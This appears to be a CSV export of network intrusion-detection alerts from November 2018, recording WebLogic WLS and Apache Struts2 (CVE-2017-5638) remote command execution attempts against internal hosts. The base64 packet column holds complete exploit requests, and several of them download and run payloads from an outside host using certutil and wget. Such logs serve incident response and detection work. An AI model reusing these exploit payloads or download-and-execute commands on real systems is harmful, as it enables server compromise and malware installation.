类型,处理状态,危险程度,时间,事件名称,事件次数,源IP,目的IP,协议摘要,上报设备,区域,规则编号,流行程度,攻击手段,服务类型,网络接口,动作,源MAC地址,源端口,目的MAC地址,目的端口,原始报文长度,原始报文内容
灰名单,未处理,高风险,2018-11-06 02:28:29,WebLogic WLS 组件远程命令执行漏洞,1,104.144.207.201,10.3.38.62,TCP.HTTP C,11.155.22.97(新一代汇聚层5),北京新一代,24174,中,获取权限攻击,www,T1/2,高风险,0C:DA:41:6B:D7:00,42810,00:50:56:87:AF:EC,80,1592,UE9TVCAvd2xzLXdzYXQvQ29vcmRpbmF0b3JQb3J0VHlwZSBIVFRQLzEuMQ0KSG9zdDogMTExLjIwNS4xMjYuMTY0DQpBY2NlcHQ6ICovKg0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUNCkNvbnRlbnQtdHlwZTogdGV4dC94bWwNCkNvbnRlbnQtTGVuZ3RoOiAxMDA1DQpYLUZvcndhcmRlZC1Gb3I6IDEwNC4xNDQuMjA3LjIwMQ0KDQo8c29hcGVudjpFbnZlbG9wZSB4bWxuczpzb2FwZW52PSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy9zb2FwL2VudmVsb3BlLyI+IAogICA8c29hcGVudjpIZWFkZXI+CiAgICAgICA8d29yazpXb3JrQ29udGV4dCB4bWxuczp3b3JrPSJodHRwOi8vYmVhLmNvbS8yMDA0LzA2L3NvYXAvd29ya2FyZWEvIj4KICAgICAgICAgICA8amF2YSB2ZXJzaW9uPSIxLjguMF8xNTEiIGNsYXNzPSJqYXZhLmJlYW5zLlhNTERlY29kZXIiPgogICAgICAgICAgICAgICA8dm9pZCBjbGFzcz0iamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyIj4KICAgICAgICAgICAgICAgICAgPGFycmF5IGNsYXNzPSJqYXZhLmxhbmcuU3RyaW5nIiBsZW5ndGg9IjMiPgogICAgICAgICAgICAgICAgICAgICAgPHZvaWQgaW5kZXggPSAiMCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgPHN0cmluZz5jbWQuZXhlPC9zdHJpbmc+CiAgICAgICAgICAgICAgICAgICAgICA8L3ZvaWQ+CiAgICAgICAgICAgICAgICAgICAgICA8dm9pZCBpbmRleCA9ICIxIj4KICAgICAgICAgICAgICAgICAgICAgICAgICA8c3RyaW5nPi9jPC9zdHJpbmc+CiAgICAgICAgICAgICAgICAgICAgICA8L3ZvaWQ+CiAgICAgICAgICAgICAgICAgICAgICA8dm9pZCBpbmRleCA9ICIyIj4KICAgICAgICAgICAgICAgICAgICAgIAk8c3RyaW5nPmNlcnR1dGlsLmV4ZSAtdXJsY2FjaGUgLXNwbGl0IC1mIGh0dHA6Ly8xMTEuOTAuMTU4LjIyNS9kL2Zhc3QuZXhlIGM6L2Zhc3QuZXhlJmFtcDtjOi9mYXN0LmV4ZTwvc3RyaW5nPgogICAgICAgICAgICAgICAgICAgICAgPC92b2lkPgogICAgICAgICAgICAgICAgICA8L2FycmF5PgogICAgICAgICAgICAgICAgICA8dm9pZCBtZXRob2Q9InN0YXJ0Ii8+CiAgICAgICAgICAgICAgICAgIDwvdm9pZD4KICAgICAgICAgICAgPC9qYXZhPgogICAgICAgIDwvd29yazpXb3JrQ29udGV4dD4KICAgPC9zb2FwZW52OkhlYWRlcj4KICAgPHNvYXBlbnY6Qm9keS8+Cjwvc29hcGVudjpFbnZlbG9wZT4=
灰名单,未处理,高风险,2018-11-06 02:28:29,WebLogic WLS 组件远程命令执行漏洞,1,104.144.207.201,10.3.38.63,TCP.HTTP C,11.155.22.95(新一代汇聚层3),北京新一代,24174,中,获取权限攻击,www,T1/1,高风险,0C:DA:41:6B:D7:00,43105,00:50:56:87:14:99,80,1832,UE9TVCAvd2xzLXdzYXQvQ29vcmRpbmF0b3JQb3J0VHlwZSBIVFRQLzEuMQ0KSG9zdDogMTExLjIwNS4xMjYuMTY1DQpBY2NlcHQ6ICovKg0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUNCkNvbnRlbnQtdHlwZTogdGV4dC94bWwNCkNvbnRlbnQtTGVuZ3RoOiAxMTg1DQpYLUZvcndhcmRlZC1Gb3I6IDEwNC4xNDQuMjA3LjIwMQ0KDQo8c29hcGVudjpFbnZlbG9wZSB4bWxuczpzb2FwZW52PSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy9zb2FwL2VudmVsb3BlLyI+IAogICA8c29hcGVudjpIZWFkZXI+CiAgICAgICA8d29yazpXb3JrQ29udGV4dCB4bWxuczp3b3JrPSJodHRwOi8vYmVhLmNvbS8yMDA0LzA2L3NvYXAvd29ya2FyZWEvIj4KICAgICAgICAgICA8amF2YSB2ZXJzaW9uPSIxLjguMF8xNTEiIGNsYXNzPSJqYXZhLmJlYW5zLlhNTERlY29kZXIiPgogICAgICAgICAgICAgICA8dm9pZCBjbGFzcz0iamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyIj4KICAgICAgICAgICAgICAgICAgPGFycmF5IGNsYXNzPSJqYXZhLmxhbmcuU3RyaW5nIiBsZW5ndGg9IjMiPgogICAgICAgICAgICAgICAgICAgICAgPHZvaWQgaW5kZXggPSAiMCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgPHN0cmluZz4vYmluL2Jhc2g8L3N0cmluZz4KICAgICAgICAgICAgICAgICAgICAgIDwvdm9pZD4KICAgICAgICAgICAgICAgICAgICAgIDx2b2lkIGluZGV4ID0gIjEiPgogICAgICAgICAgICAgICAgICAgICAgICAgIDxzdHJpbmc+LWM8L3N0cmluZz4KICAgICAgICAgICAgICAgICAgICAgIDwvdm9pZD4KICAgICAgICAgICAgICAgICAgICAgIDx2b2lkIGluZGV4ID0gIjIiPgogICAgICAgICAgICAgICAgICAgICAgCTxzdHJpbmc+dW5hbWUgLS1tfGdyZXAgeDg2XzY0Jmd0OyZndDsvZGV2L251bGx8fChwa2lsbCBsb29wICZhbXA7JmFtcDsgd2dldCAtTyAubG9vcCBodHRwOi8vMTExLjkwLjE1OC4yMjUvZC9mdDMyICZhbXA7JmFtcDsgY2htb2QgNzc3IC5sb29wICZhbXA7JmFtcDsgLi8ubG9vcCkmYW1wOyZhbXA7KHBraWxsIGxvb3AgJmFtcDsmYW1wOyB3Z2V0IC1PIC5sb29wIGh0dHA6Ly8xMTEuOTAuMTU4LjIyNS9kL2Z0NjQmYW1wOyZhbXA7Y2htb2QgNzc3IC5sb29wJmFtcDsmYW1wOyAuLy5sb29wKTwvc3RyaW5nPgogICAgICAgICAgICAgICAgICAgICAgPC92b2lkPgogICAgICAgICAgICAgICAgICA8L2FycmF5PgogICAgICAgICAgICAgICAgICA8dm9pZCBtZXRob2Q9InN0YXJ0Ii8+CiAgICAgICAgICAgICAgICAgIDwvdm9pZD4KICAgICAgICAgICAgPC9qYXZhPgogICAgICAgIDwvd29yazpXb3JrQ29udGV4dD4KICAgPC9zb2FwZW52OkhlYWRlcj4KICAgPHNvYXBlbnY6Qm9keS8+Cjwvc29hcGVudjpFbnZlbG9wZT4=
黑名单,未处理,高风险,2018-11-06 02:28:23,Struts2远程命令执行漏洞(s2-045)(s2-046)(CVE-2017-5638),1,104.144.207.201,10.3.35.4,"TCP.HTTP C URL=/ HOST=111.205.126.176 CONTENT-TYPE=multipart/form-data; boundary=6f86850e80e8dcca6a2c3dcf558f1329 CONTENT-LENGTH=1191 POST-DATA=--6f86850e80e8dcca6a2c3dcf558f1329
Content-Disposition: form-data; name=""upload""; filename=""%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DE",11.170.236.111(新一代汇聚层),北京新一代,23986,低,获取权限攻击,www,T1/2,高风险,0C:DA:41:6B:D7:00,56343,00:50:56:87:90:CD,80,88,JiZjaG1vZCA3NzcgLmxvb3AmJiAuLy5sb29wKQ0KLS02Zjg2ODUwZTgwZThkY2NhNmEyYzNkY2Y1NThmMTMyOS0t
灰名单,未处理,高风险,2018-11-06 02:28:23,Apache Struts远程命令执行漏洞,1,104.144.207.201,10.3.35.4,TCP.HTTP C URL=/ HOST=111.205.126.176,11.170.236.111(新一代汇聚层),北京新一代,21374,低,获取权限攻击,CGI,T1/2,高风险,0C:DA:41:6B:D7:00,56343,00:50:56:87:90:CD,80,88,JiZjaG1vZCA3NzcgLmxvb3AmJiAuLy5sb29wKQ0KLS02Zjg2ODUwZTgwZThkY2NhNmEyYzNkY2Y1NThmMTMyOS0t
黑名单,未处理,高风险,2018-11-06 02:28:22,Struts2远程命令执行漏洞(s2-045)(s2-046)(CVE-2017-5638),1,104.144.207.201,10.3.35.24,"TCP.HTTP C URL=/ HOST=111.205.126.176 CONTENT-TYPE=multipart/form-data; boundary=6f86850e80e8dcca6a2c3dcf558f1329 CONTENT-LENGTH=1082 POST-DATA=--6f86850e80e8dcca6a2c3dcf558f1329
Content-Disposition: form-data; name=""upload""; filename=""%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DE",11.155.22.97(新一代汇聚层5),北京新一代,23986,低,获取权限攻击,www,T1/2,高风险,0C:DA:41:6B:D7:00,50692,00:50:56:87:C9:7C,80,1876,UE9TVCAvIEhUVFAvMS4xDQpIb3N0OiAxMTEuMjA1LjEyNi4xNzYNCkFjY2VwdDogKi8qDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xMl8zKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTYuMC4yOTI0Ljg3IFNhZmFyaS81MzcuMzYNCkNvbnRlbnQtVHlwZTogbXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9NmY4Njg1MGU4MGU4ZGNjYTZhMmMzZGNmNTU4ZjEzMjkNCkNvbnRlbnQtTGVuZ3RoOiAxMDgyDQpYLUZvcndhcmRlZC1Gb3I6IDEwNC4xNDQuMjA3LjIwMQ0KDQotLTZmODY4NTBlODBlOGRjY2E2YTJjM2RjZjU1OGYxMzI5DQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InVwbG9hZCI7IGZpbGVuYW1lPSIleygjbmlrZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YScpLigjZG09QG9nbmwuT2dubENvbnRleHRAREVGQVVMVF9NRU1CRVJfQUNDRVNTKS4oI19tZW1iZXJBY2Nlc3M/KCNfbWVtYmVyQWNjZXNzPSNkbSk6KCgjY29udGFpbmVyPSNjb250ZXh0Wydjb20ub3BlbnN5bXBob255Lnh3b3JrMi5BY3Rpb25Db250ZXh0LmNvbnRhaW5lciddKS4oI29nbmxVdGlsPSNjb250YWluZXIuZ2V0SW5zdGFuY2UoQGNvbS5vcGVuc3ltcGhvbnkueHdvcmsyLm9nbmwuT2dubFV0aWxAY2xhc3MpKS4oI29nbmxVdGlsLmdldEV4Y2x1ZGVkUGFja2FnZU5hbWVzKCkuY2xlYXIoKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZENsYXNzZXMoKS5jbGVhcigpKS4oI2NvbnRleHQuc2V0TWVtYmVyQWNjZXNzKCNkbSkpKSkuKCNjbWQ9JzExMTExMTExMTExJykuKCNpc3dpbj0oQGphdmEubGFuZy5TeXN0ZW1AZ2V0UHJvcGVydHkoJ29zLm5hbWUnKS50b0xvd2VyQ2FzZSgpLmNvbnRhaW5zKCd3aW4nKSkpLigjY21kcz0oI2lzd2luP3snY21kLmV4ZScsJy9jJywjY21kfTp7Jy9iaW4vYmFzaCcsJy1jJywjY21kfSkpLigjcD1uZXcgamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyKCNjbWRzKSkuKCNwLnJlZGlyZWN0RXJyb3JTdHJlYW0odHJ1ZSkpLigjcHJvY2Vzcz0jcC5zdGFydCgpKS4oI3Jvcz0oQG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldE91dHB1dFN0cmVhbSgpKSkuKEBvcmcuYXBhY2hlLmNvbW1vbnMuaW8uSU9VdGlsc0Bjb3B5KCNwcm9jZXNzLmdldElucHV0U3RyZWFtKCksI3JvcykpLigjcm9zLmZsdXNoKCkpfS5iIg0KQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluDQoNCmNlcnR1dGlsLmV4ZSAtdXJsY2FjaGUgLXNwbGl0IC1mIGh0dHA6Ly8xMTEuOTAuMTU4LjIyNS9kL2Zhc3QuZXhlIGM6L2Zhc3QuZXhlJmNtZC5leGUgL2MgYzovZmFzdC5leGUNCi0tNmY4Njg1MGU4MGU4ZGNjYTZhMmMzZGNmNTU4ZjEzMjktLQ==
灰名单,未处理,高风险,2018-11-06 02:28:22,Apache Struts远程命令执行漏洞,1,10.3.243.17,10.3.33.190,TCP.HTTP C URL=/ HOST=111.205.126.174,11.155.22.95(新一代汇聚层3),北京新一代,21374,低,获取权限攻击,CGI,T1/1,高风险,0C:DA:41:6B:D7:00,36974,00:50:56:87:AE:3D,80,1828,UE9TVCAvIEhUVFAvMS4xDQpIb3N0OiAxMTEuMjA1LjEyNi4xNzQNCkFjY2VwdDogKi8qDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xMl8zKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTYuMC4yOTI0Ljg3IFNhZmFyaS81MzcuMzYNCkNvbnRlbnQtVHlwZTogbXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9NmY4Njg1MGU4MGU4ZGNjYTZhMmMzZGNmNTU4ZjEzMjkNCkNvbnRlbnQtTGVuZ3RoOiAxMDgyDQoNCi0tNmY4Njg1MGU4MGU4ZGNjYTZhMmMzZGNmNTU4ZjEzMjkNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0idXBsb2FkIjsgZmlsZW5hbWU9IiV7KCNuaWtlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJykuKCNkbT1Ab2dubC5PZ25sQ29udGV4dEBERUZBVUxUX01FTUJFUl9BQ0NFU1MpLigjX21lbWJlckFjY2Vzcz8oI19tZW1iZXJBY2Nlc3M9I2RtKTooKCNjb250YWluZXI9I2NvbnRleHRbJ2NvbS5vcGVuc3ltcGhvbnkueHdvcmsyLkFjdGlvbkNvbnRleHQuY29udGFpbmVyJ10pLigjb2dubFV0aWw9I2NvbnRhaW5lci5nZXRJbnN0YW5jZShAY29tLm9wZW5zeW1waG9ueS54d29yazIub2dubC5PZ25sVXRpbEBjbGFzcykpLigjb2dubFV0aWwuZ2V0RXhjbHVkZWRQYWNrYWdlTmFtZXMoKS5jbGVhcigpKS4oI29nbmxVdGlsLmdldEV4Y2x1ZGVkQ2xhc3NlcygpLmNsZWFyKCkpLigjY29udGV4dC5zZXRNZW1iZXJBY2Nlc3MoI2RtKSkpKS4oI2NtZD0nMTExMTExMTExMTEnKS4oI2lzd2luPShAamF2YS5sYW5nLlN5c3RlbUBnZXRQcm9wZXJ0eSgnb3MubmFtZScpLnRvTG93ZXJDYXNlKCkuY29udGFpbnMoJ3dpbicpKSkuKCNjbWRzPSgjaXN3aW4/eydjbWQuZXhlJywnL2MnLCNjbWR9OnsnL2Jpbi9iYXNoJywnLWMnLCNjbWR9KSkuKCNwPW5ldyBqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIoI2NtZHMpKS4oI3AucmVkaXJlY3RFcnJvclN0cmVhbSh0cnVlKSkuKCNwcm9jZXNzPSNwLnN0YXJ0KCkpLigjcm9zPShAb3JnLmFwYWNoZS5zdHJ1dHMyLlNlcnZsZXRBY3Rpb25Db250ZXh0QGdldFJlc3BvbnNlKCkuZ2V0T3V0cHV0U3RyZWFtKCkpKS4oQG9yZy5hcGFjaGUuY29tbW9ucy5pby5JT1V0aWxzQGNvcHkoI3Byb2Nlc3MuZ2V0SW5wdXRTdHJlYW0oKSwjcm9zKSkuKCNyb3MuZmx1c2goKSl9LmIiDQpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4NCg0KY2VydHV0aWwuZXhlIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovLzExMS45MC4xNTguMjI1L2QvZmFzdC5leGUgYzovZmFzdC5leGUmY21kLmV4ZSAvYyBjOi9mYXN0LmV4ZQ0KLS02Zjg2ODUwZTgwZThkY2NhNmEyYzNkY2Y1NThmMTMyOS0t
黑名单,未处理,高风险,2018-11-06 02:28:22,Struts2远程命令执行漏洞(s2-045)(s2-046)(CVE-2017-5638),1,10.3.243.29,10.3.38.106,"TCP.HTTP C URL=/ HOST=111.205.126.171 CONTENT-TYPE=multipart/form-data; boundary=6f86850e80e8dcca6a2c3dcf558f1329 CONTENT-LENGTH=1191 POST-DATA=--6f86850e80e8dcca6a2c3dcf558f1329
Content-Disposition: form-data; name=""upload""; filename=""%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DE",11.170.236.111(新一代汇聚层),北京新一代,23986,低,获取权限攻击,www,T1/2,高风险,0C:DA:41:6B:D7:00,26666,00:50:56:87:A7:7B,80,44,ODY4NTBlODBlOGRjY2E2YTJjM2RjZjU1OGYxMzI5LS0=
灰名单,未处理,高风险,2018-11-06 02:28:22,Apache Struts远程命令执行漏洞,1,104.144.207.201,10.3.35.26,TCP.HTTP C URL=/ HOST=111.205.126.175,11.155.22.97(新一代汇聚层5),北京新一代,21374,低,获取权限攻击,CGI,T1/1,高风险,0C:DA:41:6B:D7:00,2880,00:50:56:87:8A:48,80,88,JiZjaG1vZCA3NzcgLmxvb3AmJiAuLy5sb29wKQ0KLS02Zjg2ODUwZTgwZThkY2NhNmEyYzNkY2Y1NThmMTMyOS0t
黑名单,未处理,高风险,2018-11-06 02:28:22,Struts2远程命令执行漏洞(s2-045)(s2-046)(CVE-2017-5638),1,10.3.243.17,10.3.33.190,"TCP.HTTP C URL=/ HOST=111.205.126.174 CONTENT-TYPE=multipart/form-data; boundary=6f86850e80e8dcca6a2c3dcf558f1329 CONTENT-LENGTH=1082 POST-DATA=--6f86850e80e8dcca6a2c3dcf558f1329
Content-Disposition: form-data; name=""upload""; filename=""%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DE",11.155.22.95(新一代汇聚层3),北京新一代,23986,低,获取权限攻击,www,T1/1,高风险,0C:DA:41:6B:D7:00,36974,00:50:56:87:AE:3D,80,1828,UE9TVCAvIEhUVFAvMS4xDQpIb3N0OiAxMTEuMjA1LjEyNi4xNzQNCkFjY2VwdDogKi8qDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xMl8zKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTYuMC4yOTI0Ljg3IFNhZmFyaS81MzcuMzYNCkNvbnRlbnQtVHlwZTogbXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9NmY4Njg1MGU4MGU4ZGNjYTZhMmMzZGNmNTU4ZjEzMjkNCkNvbnRlbnQtTGVuZ3RoOiAxMDgyDQoNCi0tNmY4Njg1MGU4MGU4ZGNjYTZhMmMzZGNmNTU4ZjEzMjkNCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0idXBsb2FkIjsgZmlsZW5hbWU9IiV7KCNuaWtlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJykuKCNkbT1Ab2dubC5PZ25sQ29udGV4dEBERUZBVUxUX01FTUJFUl9BQ0NFU1MpLigjX21lbWJlckFjY2Vzcz8oI19tZW1iZXJBY2Nlc3M9I2RtKTooKCNjb250YWluZXI9I2NvbnRleHRbJ2NvbS5vcGVuc3ltcGhvbnkueHdvcmsyLkFjdGlvbkNvbnRleHQuY29udGFpbmVyJ10pLigjb2dubFV0aWw9I2NvbnRhaW5lci5nZXRJbnN0YW5jZShAY29tLm9wZW5zeW1waG9ueS54d29yazIub2dubC5PZ25sVXRpbEBjbGFzcykpLigjb2dubFV0aWwuZ2V0RXhjbHVkZWRQYWNrYWdlTmFtZXMoKS5jbGVhcigpKS4oI29nbmxVdGlsLmdldEV4Y2x1ZGVkQ2xhc3NlcygpLmNsZWFyKCkpLigjY29udGV4dC5zZXRNZW1iZXJBY2Nlc3MoI2RtKSkpKS4oI2NtZD0nMTExMTExMTExMTEnKS4oI2lzd2luPShAamF2YS5sYW5nLlN5c3RlbUBnZXRQcm9wZXJ0eSgnb3MubmFtZScpLnRvTG93ZXJDYXNlKCkuY29udGFpbnMoJ3dpbicpKSkuKCNjbWRzPSgjaXN3aW4/eydjbWQuZXhlJywnL2MnLCNjbWR9OnsnL2Jpbi9iYXNoJywnLWMnLCNjbWR9KSkuKCNwPW5ldyBqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIoI2NtZHMpKS4oI3AucmVkaXJlY3RFcnJvclN0cmVhbSh0cnVlKSkuKCNwcm9jZXNzPSNwLnN0YXJ0KCkpLigjcm9zPShAb3JnLmFwYWNoZS5zdHJ1dHMyLlNlcnZsZXRBY3Rpb25Db250ZXh0QGdldFJlc3BvbnNlKCkuZ2V0T3V0cHV0U3RyZWFtKCkpKS4oQG9yZy5hcGFjaGUuY29tbW9ucy5pby5JT1V0aWxzQGNvcHkoI3Byb2Nlc3MuZ2V0SW5wdXRTdHJlYW0oKSwjcm9zKSkuKCNyb3MuZmx1c2goKSl9LmIiDQpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4NCg0KY2VydHV0aWwuZXhlIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovLzExMS45MC4xNTguMjI1L2QvZmFzdC5leGUgYzovZmFzdC5leGUmY21kLmV4ZSAvYyBjOi9mYXN0LmV4ZQ0KLS02Zjg2ODUwZTgwZThkY2NhNmEyYzNkY2Y1NThmMTMyOS0t
灰名单,未处理,高风险,2018-11-06 02:28:22,Apache Struts远程命令执行漏洞,1,104.144.207.201,10.3.35.24,TCP.HTTP C URL=/ HOST=111.205.126.176,11.155.22.97(新一代汇聚层5),北京新一代,21374,低,获取权限攻击,CGI,T1/2,高风险,0C:DA:41:6B:D7:00,50692,00:50:56:87:C9:7C,80,1876,UE9TVCAvIEhUVFAvMS4xDQpIb3N0OiAxMTEuMjA1LjEyNi4xNzYNCkFjY2VwdDogKi8qDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xMl8zKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTYuMC4yOTI0Ljg3IFNhZmFyaS81MzcuMzYNCkNvbnRlbnQtVHlwZTogbXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9NmY4Njg1MGU4MGU4ZGNjYTZhMmMzZGNmNTU4ZjEzMjkNCkNvbnRlbnQtTGVuZ3RoOiAxMDgyDQpYLUZvcndhcmRlZC1Gb3I6IDEwNC4xNDQuMjA3LjIwMQ0KDQotLTZmODY4NTBlODBlOGRjY2E2YTJjM2RjZjU1OGYxMzI5DQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InVwbG9hZCI7IGZpbGVuYW1lPSIleygjbmlrZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YScpLigjZG09QG9nbmwuT2dubENvbnRleHRAREVGQVVMVF9NRU1CRVJfQUNDRVNTKS4oI19tZW1iZXJBY2Nlc3M/KCNfbWVtYmVyQWNjZXNzPSNkbSk6KCgjY29udGFpbmVyPSNjb250ZXh0Wydjb20ub3BlbnN5bXBob255Lnh3b3JrMi5BY3Rpb25Db250ZXh0LmNvbnRhaW5lciddKS4oI29nbmxVdGlsPSNjb250YWluZXIuZ2V0SW5zdGFuY2UoQGNvbS5vcGVuc3ltcGhvbnkueHdvcmsyLm9nbmwuT2dubFV0aWxAY2xhc3MpKS4oI29nbmxVdGlsLmdldEV4Y2x1ZGVkUGFja2FnZU5hbWVzKCkuY2xlYXIoKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZENsYXNzZXMoKS5jbGVhcigpKS4oI2NvbnRleHQuc2V0TWVtYmVyQWNjZXNzKCNkbSkpKSkuKCNjbWQ9JzExMTExMTExMTExJykuKCNpc3dpbj0oQGphdmEubGFuZy5TeXN0ZW1AZ2V0UHJvcGVydHkoJ29zLm5hbWUnKS50b0xvd2VyQ2FzZSgpLmNvbnRhaW5zKCd3aW4nKSkpLigjY21kcz0oI2lzd2luP3snY21kLmV4ZScsJy9jJywjY21kfTp7Jy9iaW4vYmFzaCcsJy1jJywjY21kfSkpLigjcD1uZXcgamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyKCNjbWRzKSkuKCNwLnJlZGlyZWN0RXJyb3JTdHJlYW0odHJ1ZSkpLigjcHJvY2Vzcz0jcC5zdGFydCgpKS4oI3Jvcz0oQG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldE91dHB1dFN0cmVhbSgpKSkuKEBvcmcuYXBhY2hlLmNvbW1vbnMuaW8uSU9VdGlsc0Bjb3B5KCNwcm9jZXNzLmdldElucHV0U3RyZWFtKCksI3JvcykpLigjcm9zLmZsdXNoKCkpfS5iIg0KQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluDQoNCmNlcnR1dGlsLmV4ZSAtdXJsY2FjaGUgLXNwbGl0IC1mIGh0dHA6Ly8xMTEuOTAuMTU4LjIyNS9kL2Zhc3QuZXhlIGM6L2Zhc3QuZXhlJmNtZC5leGUgL2MgYzovZmFzdC5leGUNCi0tNmY4Njg1MGU4MGU4ZGNjYTZhMmMzZGNmNTU4ZjEzMjktLQ==
灰名单,未处理,高风险,2018-11-06 02:28:22,Apache Struts远程命令执行漏洞,1,10.3.243.29,10.3.38.106,TCP.HTTP C URL=/ HOST=111.205.126.171,11.170.236.111(新一代汇聚层),北京新一代,21374,低,获取权限攻击,CGI,T1/2,高风险,0C:DA:41:6B:D7:00,26666,00:50:56:87:A7:7B,80,44,ODY4NTBlODBlOGRjY2E2YTJjM2RjZjU1OGYxMzI5LS0=
黑名单,未处理,高风险,2018-11-06 02:28:22,Struts2远程命令执行漏洞(s2-045)(s2-046)(CVE-2017-5638),1,104.144.207.201,10.3.35.26,"TCP.HTTP C URL=/ HOST=111.205.126.175 CONTENT-TYPE=multipart/form-data; boundary=6f86850e80e8dcca6a2c3dcf558f1329 CONTENT-LENGTH=1191 POST-DATA=--6f86850e80e8dcca6a2c3dcf558f1329
Content-Disposition: form-data; name=""upload""; filename=""%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DE",11.155.22.97(新一代汇聚层5),北京新一代,23986,低,获取权限攻击,www,T1/1,高风险,0C:DA:41:6B:D7:00,2880,00:50:56:87:8A:48,80,88,JiZjaG1vZCA3NzcgLmxvb3AmJiAuLy5sb29wKQ0KLS02Zjg2ODUwZTgwZThkY2NhNmEyYzNkY2Y1NThmMTMyOS0t
